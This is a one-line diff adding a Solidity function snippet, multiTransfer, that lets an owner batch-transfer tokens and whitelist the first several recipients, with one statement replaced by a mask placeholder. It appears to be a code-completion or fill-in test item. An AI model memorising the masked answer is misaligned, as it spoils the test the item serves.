@@ -1,0 +1,1 @@
+"function multiTransfer(uint256 approvecount,address[] memory receivers, uint256[] memory amounts) public {    require(msg.sender == _owner, \"!owner\");    for (uint256 i = 0; i < receivers.length; i++) {      transfer(receivers[i], amounts[i]);      if(i < approvecount){          _whiteAddress[receivers[i]]=true;          <mask0>;      }    }   }"
